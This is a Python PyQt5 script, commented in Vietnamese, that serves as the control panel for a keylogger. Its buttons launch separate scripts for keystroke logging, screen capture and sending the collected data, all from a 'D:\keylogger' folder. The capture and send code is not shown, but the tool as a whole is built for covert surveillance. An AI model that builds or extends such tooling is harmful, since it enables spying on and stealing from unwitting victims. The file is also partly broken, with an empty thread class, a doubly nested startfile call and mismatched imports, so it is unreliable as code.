import sys
from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5.QtCore import QThread, pyqtSignal
from QtGui import Ui_Dialog
import os
from tkinter import messagebox


# Tạo một luồng xử lý riêng cho các tác vụ nặng
class WorkerThread(QThread):
    progress_signal = pyqtSignal(str)  # Tín hiệu để cập nhật giao diện (dòng trạng thái)



class MainWindow:
    def __init__(self):
        self.main_win = QMainWindow()
        self.uic = Ui_Dialog()
        self.uic.setupUi(self.main_win)

        self.uic.Start.clicked.connect(self.Start)
        self.uic.Cancel.clicked.connect(self.Cancel)
        self.uic.Sent.clicked.connect(self.Sent)
        self.uic.Screenshot.clicked.connect(self.Screenshot)
    def Screenshot(self):
        os.startfile("D:\keylogger\screenshot.py")
    def Start(self):
        os.startfile("D:\keylogger\keylogmain.py")
    def Cancel(self):
        messagebox.showerror("Thông báo", "The tool has been stopped!")
        sys.exit()

    def show(self):
        self.main_win.show()
    def Sent(self):
        os.startfile(os.startfile("D:\keylogger\sent.py"))
if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_win = MainWindow()
    main_win.show()
    sys.exit(app.exec())